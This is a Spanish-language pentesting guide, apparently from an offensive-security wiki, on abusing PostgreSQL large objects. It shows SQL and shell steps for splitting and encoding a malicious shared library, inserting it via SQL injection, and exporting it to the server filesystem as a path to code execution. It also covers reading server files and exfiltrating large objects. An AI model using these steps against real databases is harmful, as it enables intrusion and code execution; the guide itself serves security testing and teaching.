# PostgreSQL Objetos Grandes

PostgreSQL expone una estructura llamada **objeto grande** (**tabla pg_largeobject**), que se utiliza para almacenar datos que serían difíciles de manejar en su totalidad (como una imagen o un documento PDF). A diferencia de la función `COPY TO`, la ventaja de los **objetos grandes** radica en el hecho de que los **datos** que **contienen** se pueden **exportar de vuelta** al **sistema de archivos** como una **copia idéntica del archivo original importado**.

Para **guardar un archivo completo dentro de esta tabla**, primero debes **crear un objeto** dentro de la tabla mencionada (identificado por un **LOID**) y luego **insertar fragmentos de 2KB** dentro de este objeto. Es muy importante que todos los **fragmentos tengan 2KB** (excepto posiblemente el último) **o** la función de **exportación** al sistema de archivos **no funcionará**.

Para **dividir** tu **binario** en **fragmentos** de tamaño **2KB**, puedes hacer:
```bash
split -b 2048 pg_exec.so #This will create files of size 2KB
```
Para codificar cada uno de los archivos creados en Base64 o Hex, puedes utilizar:
```bash
base64 -w 0 <Chunk_file> #Encoded in 1 line
xxd -ps -c 99999999999 <Chunk_file> #Encoded in 1 line
```
{% hint style="info" %}
Al explotar esto, recuerda que debes enviar **trozos de 2KB de bytes de texto claro** (no 2KB de bytes codificados en base64 o hexadecimales). Si intentas automatizar esto, el tamaño de un archivo codificado en **hexadecimal** es el **doble** (entonces necesitas enviar 4KB de datos codificados para cada trozo) y el tamaño de un archivo codificado en **base64** es `ceil(n / 3) * 4`.
{% endhint %}

Además, para depurar el proceso, puedes ver el contenido de los grandes objetos creados con:
```sql
 select loid, pageno, encode(data, 'escape') from pg_largeobject;
```
# Usando lo\_creat y Base64

Primero, necesitamos crear un LOID donde se guardará los datos binarios:
```sql
SELECT lo_creat(-1);       -- returns OID of new, empty large object
SELECT lo_create(173454);   -- attempts to create large object with OID 43213
```
Si estás abusando de una **Inyección SQL ciega**, estarás más interesado en usar `lo_create` con un **LOID fijo** para que sepas dónde tienes que **subir** el **contenido**.\
Además, ten en cuenta que no hay error de sintaxis, las funciones son `lo_creat` y `lo_create`.

LOID se utiliza para identificar el objeto en la tabla `pg_largeobject`. La inserción de fragmentos de tamaño 2KB en la tabla `pg_largeobject` se puede lograr utilizando:
```sql
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 0, decode('<B64 chunk1>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 1, decode('<B64 chunk2>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) values (173454, 3, decode('<B64 chunk2>', 'base64'));
```
Finalmente, puedes exportar el archivo al sistema de archivos haciendo (durante este ejemplo se usó el LOID `173454`):
```sql
SELECT lo_export(173454, '/tmp/pg_exec.so');
```
{% hint style="info" %}
Ten en cuenta que en las versiones más recientes de postgres es posible que necesites **subir las extensiones sin indicar ninguna ruta**. [**Lee esto para obtener más información**.](rce-with-postgresql-extensions.md#rce-in-newest-prostgres-versions)
{% endhint %}

Es posible que estés interesado en eliminar el objeto grande creado después de exportarlo:
```sql
SELECT lo_unlink(173454);  -- deletes large object with OID 173454
```
# Usando lo\_import y Hex

En este escenario se va a utilizar lo\_import para crear un objeto de gran tamaño. Afortunadamente, en este caso se puede (y no se puede) especificar el LOID que se desea utilizar:
```sql
select lo_import('C:\\Windows\\System32\\drivers\\etc\\hosts');
select lo_import('C:\\Windows\\System32\\drivers\\etc\\hosts', 173454);
```
Después de crear el objeto, puedes comenzar a insertar los datos en cada página (recuerda que debes insertar fragmentos de 2KB):
```sql
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=0;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=1;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=2;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=3;
```
El HEX debe ser solo el hexadecimal (sin `0x` o `\x`), ejemplo:
```sql
update pg_largeobject set data=decode('68656c6c6f', 'hex') where loid=173454 and pageno=0;
```
Finalmente, exporte los datos a un archivo y elimine el objeto grande:
```sql
 select lo_export(173454, 'C:\\path\to\pg_extension.dll');
 select lo_unlink(173454);  -- deletes large object with OID 173454
```
{% hint style="info" %}
Ten en cuenta que en las versiones más recientes de postgres es posible que necesites **subir las extensiones sin indicar ninguna ruta**. [**Lee esto para obtener más información**](rce-with-postgresql-extensions.md#rce-in-newest-prostgres-versions)
{% endhint %}

# Limitaciones

Después de leer la documentación de los grandes objetos en PostgreSQL, podemos descubrir que **los grandes objetos pueden tener ACL** (Lista de Control de Acceso). Es posible configurar **nuevos grandes objetos** para que tu usuario **no tenga suficientes privilegios** para leerlos, incluso si fueron creados por tu usuario.

Sin embargo, puede haber **un objeto antiguo con una ACL que permita al usuario actual leerlo**, entonces podemos exfiltrar el contenido de ese objeto.
